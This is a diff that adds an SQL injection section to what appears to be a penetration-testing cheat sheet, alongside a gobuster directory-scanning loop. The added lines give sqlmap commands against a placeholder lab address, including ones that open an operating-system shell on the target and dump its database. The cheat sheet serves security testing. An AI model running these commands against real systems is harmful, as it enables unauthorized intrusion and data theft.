@@ -276,3 +276,14 @@ for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u http
 ````bash
 sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
 ````
+
+## SQL Injection Testing (automated!)
+#### if you follow the above check list, you should have a list of parameters to test for SQL injection. Automate it with SQLMAP!
+
+#### SQLmap Commands:
+````bash
+sqlmap -u http://10.10.10.10 -p parameter
+sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
+sqlmap -u http://10.10.10.10 --os-shell
+sqlmap -u http://10.10.10.10 --dump
+````
